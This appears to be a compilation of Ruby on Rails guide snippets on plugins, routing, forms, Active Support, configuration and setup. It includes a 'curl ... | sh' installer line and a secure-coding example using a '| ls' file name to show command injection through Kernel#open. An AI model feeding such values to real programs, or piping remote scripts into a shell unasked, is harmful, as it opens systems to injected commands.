# yaffle/test/acts_as_yaffle_test.rb

require "test_helper"

class ActsAsYaffleTest < ActiveSupport::TestCase
  def test_a_hickwalls_yaffle_text_field_should_be_last_squawk
    assert_equal "last_squawk", Hickwall.yaffle_text_field
  end

  def test_a_wickwalls_yaffle_text_field_should_be_last_tweet
    assert_equal "last_tweet", Wickwall.yaffle_text_field
  end
end

----------------------------------------

TITLE: Files Changed by Authentication Generator
DESCRIPTION: A git status output showing which files were modified or added by the authentication generator. This helps understand the scope of changes made by the generator.

LANGUAGE: bash
CODE:
On branch main
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
  modified:   Gemfile
  modified:   Gemfile.lock
  modified:   app/controllers/application_controller.rb
  modified:   config/routes.rb

Untracked files:
  (use "git add <file>..." to include in what will be committed)
  app/controllers/concerns/authentication.rb
  app/controllers/passwords_controller.rb
  app/controllers/sessions_controller.rb
  app/mailers/passwords_mailer.rb
  app/models/current.rb
  app/models/session.rb
  app/models/user.rb
  app/views/passwords/
  app/views/passwords_mailer/
  app/views/sessions/
  db/migrate/
  db/schema.rb
  test/mailers/previews/

----------------------------------------

TITLE: Configuring Active Record Schema Format
DESCRIPTION: Sets the schema format for Active Record to Ruby format. This configures a specific Rails component (Active Record) through the config object in config/application.rb.

LANGUAGE: ruby
CODE:
config.active_record.schema_format = :ruby

----------------------------------------

TITLE: Creating Namespaced Forms in ActionView
DESCRIPTION: Demonstrates how to provide a namespace for a form to ensure uniqueness of ID attributes on form elements. The namespace attribute will be prefixed with underscore on the generated HTML id.

LANGUAGE: erb
CODE:
<%= form_for(@offer, :namespace => 'namespace') do |f| %>
  <%= f.label :version, 'Version' %>:
  <%= f.text_field :version %>
<% end %>

----------------------------------------

TITLE: Updating View Cache Keys for Active Storage Variant Changes
DESCRIPTION: Shows how to update Rails view cache keys when migrating to libvips to prevent cached image URLs with old transformation parameters from breaking.

LANGUAGE: ruby
CODE:
<% @products.each do |product| %>
  <% cache ["v2", product] do %>
    <%= image_tag product.cover_photo.variant(resize_to_limit: [200, nil]) %>
  <% end %>
<% end %>

----------------------------------------

TITLE: Structured English Locale Configuration with Nested Keys
DESCRIPTION: Shows how to organize translations with nested keys in the English locale file. The structure follows controller/action/key pattern for better organization.

LANGUAGE: yaml
CODE:
en:
  hello: "Hello world"
  products:
    index:
      title: "Products"

----------------------------------------

TITLE: Resolving Thread Deadlocks with permit_concurrent_loads
DESCRIPTION: Shows the correct approach to avoid deadlocks when joining threads within Rails application code. The permit_concurrent_loads method temporarily releases the running lock to allow other threads to perform autoloading.

LANGUAGE: ruby
CODE:
Rails.application.executor.wrap do
  th = Thread.new do
    Rails.application.executor.wrap do
      User # inner thread can acquire the 'load' lock,
           # load User, and continue
    end
  end

  ActiveSupport::Dependencies.interlock.permit_concurrent_loads do
    th.join # outer thread waits here, but has no lock
  end
end

----------------------------------------

TITLE: Configuring Test Model with Custom Field Option
DESCRIPTION: Example of how to configure a model with custom options for the acts_as_yaffle method. This demonstrates passing configuration options to the plugin.

LANGUAGE: ruby
CODE:
# test/dummy/app/models/wickwall.rb

class Wickwall < ApplicationRecord
  acts_as_yaffle yaffle_text_field: :last_tweet
end

----------------------------------------

TITLE: Creating Product Test Fixtures in YAML
DESCRIPTION: Defines a YAML fixture for the product model to use in tests. Creates a T-shirt product with an inventory count for testing product inventory functionality.

LANGUAGE: yaml
CODE:
tshirt:
  name: T-Shirt
  inventory_count: 15

----------------------------------------

TITLE: Squashing Commits for Rails Pull Requests using Git
DESCRIPTION: This snippet demonstrates how to squash multiple commits into a single commit before submitting a pull request to Rails. It includes fetching the latest Rails code, rebasing interactively, and force pushing the changes to your fork.

LANGUAGE: bash
CODE:
$ git fetch rails
$ git checkout my_new_branch
$ git rebase -i rails/main

< Choose 'squash' for all of your commits except the first one. >
< Edit the commit message to make sense, and describe all your changes. >

$ git push fork my_new_branch --force-with-lease

----------------------------------------

TITLE: Using Duration ISO8601 formatting
DESCRIPTION: ActiveSupport::Duration now supports ISO8601 format for serializing and parsing time durations, improving interoperability with other systems.

LANGUAGE: ruby
CODE:
# Example
1.day.iso8601 # => "P1D"
ActiveSupport::Duration.parse("P1D") # => 1 day

----------------------------------------

TITLE: Configuring Custom Database Connection Resolver
DESCRIPTION: Configuration for setting up a custom resolver for database connection switching, specifying the delay and custom resolver class.

LANGUAGE: ruby
CODE:
config.active_record.database_selector = { delay: 2.seconds }
config.active_record.database_resolver = ActiveRecord::Middleware::DatabaseSelector::Resolver
config.active_record.database_resolver_context = MyCookieResolver

----------------------------------------

TITLE: Installing Dependencies with Homebrew on macOS
DESCRIPTION: Commands to install all required dependencies for Rails development on macOS using Homebrew. This includes installing services like MySQL, PostgreSQL, Redis, and other tools needed for testing various Rails components.

LANGUAGE: bash
CODE:
$ brew bundle

----------------------------------------

TITLE: Defining Fixtures for Models with Composite Primary Keys
DESCRIPTION: Shows how to define fixture data for a model with a composite primary key that includes an id column.

LANGUAGE: yml
CODE:
# books.yml
alices_adventure_in_wonderland:
  author_id: <%= ActiveRecord::FixtureSet.identify(:lewis_carroll) %>
  title: "Alice's Adventures in Wonderland"

----------------------------------------

TITLE: Running Tests in Serial Mode in Rails
DESCRIPTION: Shows how to run tests in serial (non-parallel) mode by setting PARALLEL_WORKERS=1. This can help diagnose random test failures that may be caused by concurrency issues.

LANGUAGE: bash
CODE:
$ cd actionview
$ PARALLEL_WORKERS=1 SEED=53708 bin/test test/template/test_case_test.rb

----------------------------------------

TITLE: Generated HTML from a form_with Model-based Form
DESCRIPTION: Shows the HTML output generated by the form_with helper when used with a Book model. Includes authenticity token, scoped input names, and auto-generated submit button text.

LANGUAGE: html
CODE:
<form action="/books" accept-charset="UTF-8" method="post">
  <input type="hidden" name="authenticity_token" value="ChwHeyegcpAFDdBvXvDuvbfW7yCA3e8gvhyieai7DhG28C3akh-dyuv-IBittsjPrIjETlQQvQJ91T77QQ8xWA" autocomplete="off">
  <div>
    <label for="book_title">Title</label>
    <input type="text" name="book[title]" id="book_title">
  </div>
  <div>
    <label for="book_author">Author</label>
    <input type="text" name="book[author]" id="book_author">
  </div>
  <input type="submit" name="commit" value="Create Book" data-disable-with="Create Book">
</form>

----------------------------------------

TITLE: Implementing Product Mailer for In-Stock Notifications
DESCRIPTION: Ruby code for the ProductMailer class that sends notifications when products are back in stock.

LANGUAGE: ruby
CODE:
class ProductMailer < ApplicationMailer
  # Subject can be set in your I18n file at config/locales/en.yml
  # with the following lookup:
  #
  #   en.product_mailer.in_stock.subject
  #
  def in_stock
    @product = params[:product]
    mail to: params[:subscriber].email
  end
end

----------------------------------------

TITLE: Sample JavaScript Asset for Rails
DESCRIPTION: Example JavaScript file that would be placed in the app/assets/javascripts directory and served by Propshaft in a Rails application.

LANGUAGE: javascript
CODE:
// app/assets/javascripts/main.js
console.log("Hello, world!");

----------------------------------------

TITLE: Dividing Arrays into Equal Groups with in_groups in Rails
DESCRIPTION: Shows how to use the in_groups method to split an array into a specified number of groups. The examples demonstrate different approaches to handling the padding of smaller groups.

LANGUAGE: ruby
CODE:
%w(1 2 3 4 5 6 7).in_groups(3)
# => [["1", "2", "3"], ["4", "5", nil], ["6", "7", nil]]

LANGUAGE: ruby
CODE:
%w(1 2 3 4 5 6 7).in_groups(3) { |group| p group }
["1", "2", "3"]
["4", "5", nil]
["6", "7", nil]

LANGUAGE: ruby
CODE:
%w(1 2 3 4 5 6 7).in_groups(3, "0")
# => [["1", "2", "3"], ["4", "5", "0"], ["6", "7", "0"]]

LANGUAGE: ruby
CODE:
%w(1 2 3 4 5 6 7).in_groups(3, false)
# => [["1", "2", "3"], ["4", "5"], ["6", "7"]]

----------------------------------------

TITLE: Handling DST Changes with Time in Ruby
DESCRIPTION: Time objects in Ruby properly handle Daylight Saving Time transitions unlike DateTime objects which are not DST-aware.

LANGUAGE: ruby
CODE:
Time.zone_default
# => #<ActiveSupport::TimeZone:0x7f73654d4f38 @utc_offset=nil, @name="Madrid", ...>

# In Barcelona, 2010/03/28 02:00 +0100 becomes 2010/03/28 03:00 +0200 due to DST.
t = Time.local(2010, 3, 28, 1, 59, 59)
# => Sun Mar 28 01:59:59 +0100 2010
t.advance(seconds: 1)
# => Sun Mar 28 03:00:00 +0200 2010

----------------------------------------

TITLE: Using expect Method for Scalar Parameters in Rails
DESCRIPTION: This snippet shows how to use the expect method to safely require and permit a scalar parameter. It will always return a scalar value and not an array or hash.

LANGUAGE: ruby
CODE:
id = params.expect(:id)

----------------------------------------

TITLE: Linking to CSS Files with stylesheet_link_tag in Rails
DESCRIPTION: Shows how to use the stylesheet_link_tag helper to include CSS stylesheets from various locations. The helper generates link tags that are processed by the Asset Pipeline.

LANGUAGE: erb
CODE:
<%= stylesheet_link_tag "main" %>

LANGUAGE: erb
CODE:
<%= stylesheet_link_tag "main", "columns" %>

LANGUAGE: erb
CODE:
<%= stylesheet_link_tag "main", "photos/columns" %>

LANGUAGE: erb
CODE:
<%= stylesheet_link_tag "http://example.com/main.css" %>

LANGUAGE: erb
CODE:
<%= stylesheet_link_tag "main_print", media: "print" %>

----------------------------------------

TITLE: Generated Model Test Skeleton Structure
DESCRIPTION: Shows the basic structure of a generated model test file in Rails, which inherits from ActiveSupport::TestCase.

LANGUAGE: ruby
CODE:
# article_test.rb
require "test_helper"

class ArticleTest < ActiveSupport::TestCase
  # test "the truth" do
  #   assert true
  # end
end

----------------------------------------

TITLE: Matching All HTTP Verbs with via: :all in Rails
DESCRIPTION: Creates a route that responds to all HTTP verbs using via: :all. This should be used cautiously due to security implications, particularly with GET requests modifying data.

LANGUAGE: ruby
CODE:
match "photos", to: "photos#show", via: :all

----------------------------------------

TITLE: Configuring CDN Asset Host in Rails Production Environment
DESCRIPTION: Sets the CDN subdomain as the asset host in the Rails production environment configuration. This directs all asset requests to the CDN instead of the Rails server.

LANGUAGE: ruby
CODE:
config.asset_host = "mycdnsubdomain.fictional-cdn.com"

----------------------------------------

TITLE: Creating Initial Acts As Yaffle Module Structure
DESCRIPTION: Basic module structure for the ActsAsYaffle functionality. This establishes the namespace and module that will contain the Active Record extension.

LANGUAGE: ruby
CODE:
# yaffle/lib/yaffle/acts_as_yaffle.rb

module Yaffle
  module ActsAsYaffle
  end
end

----------------------------------------

TITLE: Moving Middlewares After Other Middlewares in Rails Configuration
DESCRIPTION: Shows how to change the order of middlewares by moving one middleware after another using the config.middleware.move_after method. This provides control over middleware execution order.

LANGUAGE: ruby
CODE:
# config/application.rb

# Move ActionDispatch::ShowExceptions to after Lifo::ShowExceptions
config.middleware.move_after Lifo::ShowExceptions, ActionDispatch::ShowExceptions

----------------------------------------

TITLE: Renaming Path Segments with :path_names Option in Rails Routes
DESCRIPTION: Shows how to override the default 'new' and 'edit' segments in RESTful routes using the :path_names option. This changes URL paths while maintaining standard helper names and controller actions.

LANGUAGE: ruby
CODE:
resources :photos, path_names: { new: "make", edit: "change" }

----------------------------------------

TITLE: Customizing BigDecimal#to_s in Ruby on Rails
DESCRIPTION: Active Support overrides the default to_s method to use a floating-point representation by default instead of engineering notation, while still supporting the original formats.

LANGUAGE: ruby
CODE:
BigDecimal(5.00, 6).to_s       # => "5.0"

----------------------------------------

TITLE: Accessing Generator Command Line Options in Ruby
DESCRIPTION: Example of accessing command line options in a generator method using the options hash. This snippet shows how to retrieve and use the 'scope' option passed to the generator.

LANGUAGE: ruby
CODE:
def copy_initializer_file
  @scope = options["scope"]
end

----------------------------------------

TITLE: Formatting File Sizes in Ruby on Rails
DESCRIPTION: The to_fs(:human_size) method formats numbers as human-readable file sizes, automatically choosing appropriate units (bytes, KB, MB, GB, etc.).

LANGUAGE: ruby
CODE:
123.to_fs(:human_size)                  # => 123 Bytes
1234.to_fs(:human_size)                 # => 1.21 KB
12345.to_fs(:human_size)                # => 12.1 KB
1234567.to_fs(:human_size)              # => 1.18 MB
1234567890.to_fs(:human_size)           # => 1.15 GB
1234567890123.to_fs(:human_size)        # => 1.12 TB
1234567890123456.to_fs(:human_size)     # => 1.1 PB
1234567890123456789.to_fs(:human_size)  # => 1.07 EB

----------------------------------------

TITLE: Rendering Templates with Explicit Template Option
DESCRIPTION: Using the :template option to explicitly specify a template from another controller, which was required in older Rails versions.

LANGUAGE: ruby
CODE:
render template: "products/show"

----------------------------------------

TITLE: Setting Up Acts As Yaffle Test File
DESCRIPTION: Initial test file structure for testing the 'acts_as_yaffle' functionality. This shows the basic setup for testing Active Record extensions in a plugin.

LANGUAGE: ruby
CODE:
# yaffle/test/acts_as_yaffle_test.rb

require "test_helper"

class ActsAsYaffleTest < ActiveSupport::TestCase
end

----------------------------------------

TITLE: Defining Application Record with ActsAsYaffle in Rails
DESCRIPTION: ApplicationRecord class that inherits from ActiveRecord::Base and includes the Yaffle::ActsAsYaffle module. It sets the class as abstract, serving as a base class for other models.

LANGUAGE: ruby
CODE:
class ApplicationRecord < ActiveRecord::Base
  include Yaffle::ActsAsYaffle

  self.abstract_class = true
end

----------------------------------------

TITLE: Viewing Rails Plugin Generator Help
DESCRIPTION: Command to display all available options for the Rails plugin generator.

LANGUAGE: bash
CODE:
$ rails plugin --help

----------------------------------------

TITLE: Setting Error Reporting Options with Context and Severity
DESCRIPTION: Example of providing context and setting severity level when handling errors. These options are passed to all subscribers along with the error.

LANGUAGE: ruby
CODE:
Rails.error.handle(context: { user_id: user.id }, severity: :info) do
  # ...
end

----------------------------------------

TITLE: Changing Default View Path for Rails Mailers
DESCRIPTION: Ruby code showing how to change the default view path for a mailer class using prepend_view_path. This allows mailer templates to be located outside the standard app/views directory structure.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  prepend_view_path "custom/path/to/mailer/view"

  # This will try to load "custom/path/to/mailer/view/welcome_email" template
  def welcome_email
    # ...
  end
end

----------------------------------------

TITLE: Setting Up PostgreSQL User on Linux/BSD
DESCRIPTION: Command to create a PostgreSQL superuser that matches your system username on Linux or BSD systems. This is required for running Active Record tests with PostgreSQL.

LANGUAGE: bash
CODE:
$ sudo -u postgres createuser --superuser $USER

----------------------------------------

TITLE: Pulling Remote Changes from a Fork in Rails
DESCRIPTION: Adds a remote repository and pulls changes from a contributor's forked branch for testing. This example shows how to access and apply changes from a user named JohnSmith with a branch called 'orange'.

LANGUAGE: bash
CODE:
$ git remote add JohnSmith https://github.com/JohnSmith/rails.git
$ git pull JohnSmith orange

----------------------------------------

TITLE: Incorrect Namespace Definition Using Class.new in Ruby
DESCRIPTION: Shows an incorrect way to define namespaces that will cause autoloading issues with child objects. This approach won't work for explicit namespaces where child objects need to be located.

LANGUAGE: ruby
CODE:
Hotel = Class.new

----------------------------------------

TITLE: Using Web-Console in a Rails Controller
DESCRIPTION: Demonstrates how to invoke the web-console debugging tool within a controller action. The console method renders an interactive Ruby console alongside the HTML content, allowing for runtime debugging.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  def new
    console
    @post = Post.new
  end
end

----------------------------------------

TITLE: Setting Parallelization Threshold at TestCase Level in Rails
DESCRIPTION: Configures the threshold for parallelization at the test case level, determining the minimum number of tests required before parallelization is applied to the test case.

LANGUAGE: ruby
CODE:
class ActiveSupport::TestCase
  parallelize threshold: 100
end

----------------------------------------

TITLE: Rendering Inventory Partial in Product Show View
DESCRIPTION: Code to render the inventory status partial in the product show template.

LANGUAGE: erb
CODE:
<%= render "inventory", product: @product %>

----------------------------------------

TITLE: Controller Update Action in Rails 4
DESCRIPTION: Example of an update action in a Rails controller. In Rails 4, this action handles both PATCH (preferred) and PUT requests for compatibility.

LANGUAGE: ruby
CODE:
class UsersController < ApplicationController
  def update
    # No change needed; PATCH will be preferred, and PUT will still work.
  end
end

----------------------------------------

TITLE: Checking Range Overlap in Rails
DESCRIPTION: The overlap? method determines whether two ranges have a non-void intersection, returning true if they overlap and false otherwise.

LANGUAGE: ruby
CODE:
(1..10).overlap?(7..11)  # => true
(1..10).overlap?(0..7)   # => true
(1..10).overlap?(11..27) # => false

----------------------------------------

TITLE: Disabling Request Forgery Protection for Action Cable
DESCRIPTION: Ruby configuration code to disable request forgery protection for Action Cable, allowing connections from any origin. This is not recommended for production environments due to security concerns.

LANGUAGE: ruby
CODE:
config.action_cable.disable_request_forgery_protection = true

----------------------------------------

TITLE: Missing Attachment Partial for User
DESCRIPTION: Partial template used when an embedded User record cannot be found.

LANGUAGE: html
CODE:
<%# app/views/users/missing_attachable.html.erb %>
<span>Deleted user</span>

----------------------------------------

TITLE: Implementing Web Notifications Channel in Ruby
DESCRIPTION: Creates a channel for sending web notifications to specific users. This simple implementation streams notifications for the current user only.

LANGUAGE: ruby
CODE:
# app/channels/web_notifications_channel.rb
class WebNotificationsChannel < ApplicationCable::Channel
  def subscribed
    stream_for current_user
  end
end

----------------------------------------

TITLE: Converting Hash Keys to Symbols with symbolize_keys in Rails
DESCRIPTION: The symbolize_keys method returns a new hash with keys converted to symbols where possible by calling to_sym on them. In case of key collision, the most recent value is retained. Useful for accepting both symbols and strings as options.

LANGUAGE: ruby
CODE:
{ nil => nil, 1 => 1, "a" => "a" }.symbolize_keys
# => {nil=>nil, 1=>1, :a=>"a"}

LANGUAGE: ruby
CODE:
{ "a" => 1, a: 2 }.symbolize_keys
# => {:a=>2}

LANGUAGE: ruby
CODE:
def rich_textarea_tag(name, value = nil, options = {})
  options = options.symbolize_keys

  options[:input] ||= "trix_input_#{ActionText::TagHelper.id += 1}"
  # ...
end

LANGUAGE: ruby
CODE:
{ nil => nil, 1 => 1, "nested" => { "a" => 3, 5 => 5 } }.deep_symbolize_keys
# => {nil=>nil, 1=>1, nested:{a:3, 5=>5}}

----------------------------------------

TITLE: Generated Generator Class
DESCRIPTION: The generator class created by the generator generator, inheriting from Rails::Generators::NamedBase which requires a name argument when invoked.

LANGUAGE: ruby
CODE:
class InitializerGenerator < Rails::Generators::NamedBase
  source_root File.expand_path("templates", __dir__)
end

----------------------------------------

TITLE: Using the change method with Date objects in Ruby on Rails
DESCRIPTION: The change method allows creating a new date that is the same as the receiver except for the specified components (year, month, or day). It will raise ArgumentError for invalid dates.

LANGUAGE: ruby
CODE:
Date.new(2010, 12, 23).change(year: 2011, month: 11)
# => Wed, 23 Nov 2011

LANGUAGE: ruby
CODE:
Date.new(2010, 1, 31).change(month: 2)
# => ArgumentError: invalid date

----------------------------------------

TITLE: Creating a Custom Test Unit Model Generator in Ruby
DESCRIPTION: A Ruby class that defines a custom test unit model generator to replace Rails' built-in test unit model generator. This generator performs custom actions during the test generation process.

LANGUAGE: ruby
CODE:
module MyTestUnit
  class ModelGenerator < Rails::Generators::NamedBase
    source_root File.expand_path("templates", __dir__)

    def do_different_stuff
      say "Doing different stuff..."
    end
  end
end

----------------------------------------

TITLE: Adding Gems to Gemfile with gem Method
DESCRIPTION: Examples of adding gem entries to the generated application's Gemfile using the gem method, including specifying versions and adding comments.

LANGUAGE: ruby
CODE:
gem "bj"
gem "nokogiri"

LANGUAGE: ruby
CODE:
gem "nokogiri", "~> 1.16.4"

LANGUAGE: ruby
CODE:
gem "nokogiri", "~> 1.16.4", comment: "Add the nokogiri gem for XML parsing"

----------------------------------------

TITLE: Using TaggedLogging for Custom Log Filtering in Rails
DESCRIPTION: Demonstrates how to use TaggedLogging to add custom tags to log entries, which is useful for filtering logs in multi-user, multi-account applications.

LANGUAGE: ruby
CODE:
logger = ActiveSupport::TaggedLogging.new(Logger.new(STDOUT))
logger.tagged("BCX") { logger.info "Stuff" }                            # Logs "[BCX] Stuff"
logger.tagged("BCX", "Jason") { logger.info "Stuff" }                   # Logs "[BCX] [Jason] Stuff"
logger.tagged("BCX") { logger.tagged("Jason") { logger.info "Stuff" } } # Logs "[BCX] [Jason] Stuff"

----------------------------------------

TITLE: Setting Up Ruby Development Environment in WSL on Windows
DESCRIPTION: This snippet demonstrates how to set up a Ruby development environment within the Windows Subsystem for Linux by installing required dependencies and using the Mise version manager to install Ruby 3.

LANGUAGE: bash
CODE:
# Install dependencies with apt
$ sudo apt update
$ sudo apt install build-essential rustc libssl-dev libyaml-dev zlib1g-dev libgmp-dev

# Install Mise version manager
$ curl https://mise.run | sh
$ echo 'eval "$(~/.local/bin/mise activate bash)"' >> ~/.bashrc
$ source ~/.bashrc

# Install Ruby globally with Mise
$ mise use -g ruby@3

----------------------------------------

TITLE: Accessing Namespaced Models in Rails Console
DESCRIPTION: Example of how to reference a namespaced model in the Rails console. The Article model must be referenced with its full namespace as Blorgh::Article.

LANGUAGE: ruby
CODE:
irb> Blorgh::Article.find(1)
=> #<Blorgh::Article id: 1 ...>

----------------------------------------

TITLE: Using ERB Local Variable with Reserved Ruby Keywords
DESCRIPTION: Example of accessing a local variable named after a Ruby keyword (like 'class') in an ERB template using binding.local_variable_get to avoid conflicts.

LANGUAGE: erb
CODE:
<%# locals: (class: "message") %>
<div class="<%= binding.local_variable_get(:class) %>">...</div>

----------------------------------------

TITLE: Manually Reporting Errors with Rails.error.report
DESCRIPTION: How to manually report caught exceptions using Rails.error.report within a traditional rescue block. Any options passed are forwarded to subscribers.

LANGUAGE: ruby
CODE:
begin
  # code
rescue StandardError => e
  Rails.error.report(e)
end

----------------------------------------

TITLE: Alternative Model Field Update in Rails Plugin
DESCRIPTION: Ruby code snippet demonstrating an alternative way to update a model field in a Rails plugin using dynamic method assignment with 'send' instead of 'write_attribute'.

LANGUAGE: ruby
CODE:
send("#{self.class.yaffle_text_field}=", string.to_squawk)

----------------------------------------

TITLE: Including an Engine in a Rails Application
DESCRIPTION: How to include a local engine in a Rails application's Gemfile using the path option.

LANGUAGE: ruby
CODE:
gem "blorgh", path: "engines/blorgh"

----------------------------------------

TITLE: Defining Custom Configuration Options with Namespace in Rails
DESCRIPTION: Demonstrates how to use the new 'x' namespace for defining custom configuration options in Rails. These custom configurations can be accessed through the Rails.configuration.x object.

LANGUAGE: ruby
CODE:
# config/environments/production.rb
config.x.payment_processing.schedule = :daily
config.x.payment_processing.retries  = 3
config.x.super_debugger              = true

LANGUAGE: ruby
CODE:
Rails.configuration.x.payment_processing.schedule # => :daily
Rails.configuration.x.payment_processing.retries  # => 3
Rails.configuration.x.super_debugger              # => true

----------------------------------------

TITLE: Configuring Autoload Once Paths in Rails Application
DESCRIPTION: Sets up a directory path that should be loaded only once in a Rails application by adding the serializers directory to autoload_once_paths configuration.

LANGUAGE: ruby
CODE:
# config/application.rb
module YourApp
  class Application < Rails::Application
    config.autoload_once_paths << "#{root}/app/serializers"
  end
end

----------------------------------------

TITLE: Creating Select Boxes with Different Values and Labels
DESCRIPTION: Shows how to create a select box where the option values differ from their display labels. This is useful when you need to submit codes or IDs instead of display names.

LANGUAGE: erb
CODE:
<%= form.select :city, [["Berlin", "BE"], ["Chicago", "CHI"], ["Madrid", "MD"]] %>

----------------------------------------

TITLE: Testing View Rendering with document_root_element
DESCRIPTION: Example of testing a rendered partial by accessing its DOM through document_root_element, which returns a Nokogiri::XML::Node. This allows for complex DOM traversal and assertions.

LANGUAGE: ruby
CODE:
test "renders a link to itself" do
  article = Article.create! title: "Hello, world"

  render "articles/article", article: article
  anchor = document_root_element.at("a")

  assert_equal article.name, anchor.text
  assert_equal article_url(article), anchor["href"]
end

----------------------------------------

TITLE: Method Delegation with delegate Macro in Ruby on Rails
DESCRIPTION: Shows how to use the delegate macro to forward methods to other objects, simplifying method delegation and making code more maintainable. Supports options like prefix, allow_nil, and private.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_one :profile
end

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_one :profile

  def name
    profile.name
  end
end

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_one :profile

  delegate :name, to: :profile
end

LANGUAGE: ruby
CODE:
delegate :name, :age, :address, :twitter, to: :profile

LANGUAGE: ruby
CODE:
# delegates to the Rails constant
delegate :logger, to: :Rails

# delegates to the receiver's class
delegate :table_name, to: :class

LANGUAGE: ruby
CODE:
delegate :name, to: :profile, allow_nil: true

LANGUAGE: ruby
CODE:
delegate :street, to: :address, prefix: true

LANGUAGE: ruby
CODE:
delegate :size, to: :attachment, prefix: :avatar

LANGUAGE: ruby
CODE:
delegate :date_of_birth, to: :profile, private: true

----------------------------------------

TITLE: Controller Test with AJAX Request
DESCRIPTION: Shows how to test an update action with AJAX by setting the xhr parameter to true.

LANGUAGE: ruby
CODE:
patch article_url(Article.last), params: { article: { title: "updated" } }, xhr: true

----------------------------------------

TITLE: Accessing Zeitwerk Loader in Rails Application
DESCRIPTION: Code example showing how to access the Zeitwerk loader object directly in a Rails application, which might be needed for advanced configurations like STI preloading or custom inflectors.

LANGUAGE: ruby
CODE:
Rails.autoloaders.main

----------------------------------------

TITLE: Creating User Account in Rails Console
DESCRIPTION: IRB command for the Rails console to create a user with email and password. Uses the User.create! method that raises an exception if validation fails.

LANGUAGE: irb
CODE:
store(dev)> User.create! email_address: "you@example.org", password: "s3cr3t", password_confirmation: "s3cr3t"

----------------------------------------

TITLE: Using prev_day and next_day Methods with Time in Ruby
DESCRIPTION: The prev_day and next_day methods return a time in the previous or next day at the same hour, minute, and second.

LANGUAGE: ruby
CODE:
t = Time.new(2010, 5, 8) # => 2010-05-08 00:00:00 +0900
t.prev_day               # => 2010-05-07 00:00:00 +0900
t.next_day               # => 2010-05-09 00:00:00 +0900

----------------------------------------

TITLE: Using prev_month and next_month Methods with Time in Ruby
DESCRIPTION: Methods to get the time with the same day in the previous or next month. If the day doesn't exist in the target month, returns the last day of that month.

LANGUAGE: ruby
CODE:
t = Time.new(2010, 5, 8) # => 2010-05-08 00:00:00 +0900
t.prev_month             # => 2010-04-08 00:00:00 +0900
t.next_month             # => 2010-06-08 00:00:00 +0900

----------------------------------------

TITLE: Action Cable Configuration in YAML
DESCRIPTION: Configuration settings for Action Cable in different environments using the cable.yml file. It defines subscription adapters for development, test, and production environments including Redis configuration with connection URL and channel prefix.

LANGUAGE: yaml
CODE:
development:
  adapter: async

test:
  adapter: test

production:
  adapter: redis
  url: redis://10.10.3.153:6381
  channel_prefix: appname_production

----------------------------------------

TITLE: Action Mailbox Process Event Structure
DESCRIPTION: Shows the structure of the payload for the process.action_mailbox event. Includes the mailbox instance and data about the inbound email being processed.

LANGUAGE: ruby
CODE:
{
  mailbox: #<RepliesMailbox:0x00007f9f7a8388>,
  inbound_email: {
    id: 1,
    message_id: "0CB459E0-0336-41DA-BC88-E6E28C697DDB@37signals.com",
    status: "processing"
  }
}

----------------------------------------

TITLE: Implementing session_store= Method with camelize in Action Controller
DESCRIPTION: Demonstrates how Rails uses camelize to dynamically load session store classes from symbols, converting the symbol to a class name.

LANGUAGE: ruby
CODE:
def session_store=(store)
  @@session_store = store.is_a?(Symbol) ?
    ActionDispatch::Session.const_get(store.to_s.camelize) :
    store
end

----------------------------------------

TITLE: Implementing Strict Locals in Rails Partials
DESCRIPTION: Shows how to use the strict locals syntax to define the compiled partial signature, ensuring only a single version of the partial is compiled regardless of the varying local variables passed.

LANGUAGE: html+erb
CODE:
<%# locals: (article:, theme: "light") -%>
...

----------------------------------------

TITLE: Configuring MessagePack as Cookies Serializer
DESCRIPTION: Example showing how to use MessagePack as the serializer for cookies in a Rails application.

LANGUAGE: ruby
CODE:
config.action_dispatch.cookies_serializer = :message_pack

----------------------------------------

TITLE: Example of Resolve Method Usage in Rails Views
DESCRIPTION: Shows how the resolve method affects form generation in views. The form_with helper will use the custom URL mapping defined by resolve instead of the default resourceful route.

LANGUAGE: ruby
CODE:
<%= form_with model: @basket do |form| %>
  <!-- basket form -->
<% end %>

----------------------------------------

TITLE: Custom Cookie-Based Database Resolver Implementation
DESCRIPTION: Example of a custom resolver class that uses cookies instead of session to track when to switch between writer and replica databases.

LANGUAGE: ruby
CODE:
class MyCookieResolver < ActiveRecord::Middleware::DatabaseSelector::Resolver
  def self.call(request)
    new(request.cookies)
  end

  def initialize(cookies)
    @cookies = cookies
  end

  attr_reader :cookies

  def last_write_timestamp
    self.class.convert_timestamp_to_time(cookies[:last_write])
  end

  def update_last_write_timestamp
    cookies[:last_write] = self.class.convert_time_to_timestamp(Time.now)
  end

  def save(response)
  end
end

----------------------------------------

TITLE: Adding Rich Text Field to a Rails Model
DESCRIPTION: Shows how to add a rich text field to a Product model using has_rich_text. This enables storing formatted text with multimedia elements for the description attribute.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  has_rich_text :description
  validates :name, presence: true
end

----------------------------------------

TITLE: SQL Generated for Default Composite Primary Key Association
DESCRIPTION: Shows the SQL that Rails generates by default when loading an Order associated with a Book.

LANGUAGE: sql
CODE:
SELECT * FROM orders WHERE id = 2

----------------------------------------

TITLE: Using fetch with local_assigns for Default Values in Rails Partials
DESCRIPTION: Demonstrates how to use the fetch method with local_assigns to provide default values for optional parameters in Rails partials.

LANGUAGE: html+erb
CODE:
<%# app/views/products/_product.html.erb %>

<% local_assigns.fetch(:related_products, []).each do |related_product| %>
  <%# ... %>
<% end %>

----------------------------------------

TITLE: Using select_year Helper in Rails ERB
DESCRIPTION: This snippet demonstrates how to use the select_year helper to render a select box for a year. This is a 'bare' helper method that is not called on a form builder instance.

LANGUAGE: erb
CODE:
<%= select_year 2024, prefix: "party" %>

----------------------------------------

TITLE: Adding Optional Middleware to Rails API Application
DESCRIPTION: Example of how to add an optional middleware to a Rails API application that is not included by default.

LANGUAGE: ruby
CODE:
config.middleware.use Rack::MethodOverride

----------------------------------------

TITLE: Secure Alternatives to Kernel#open in Ruby
DESCRIPTION: Safe alternatives to Kernel#open that don't execute OS commands, including File.open, IO.open, and URI#open.

LANGUAGE: ruby
CODE:
File.open("| ls") { |file| file.read }
# doesn't execute `ls` command, just opens `| ls` file if it exists

IO.open(0) { |file| file.read }
# opens stdin. doesn't accept a String as the argument

require "open-uri"
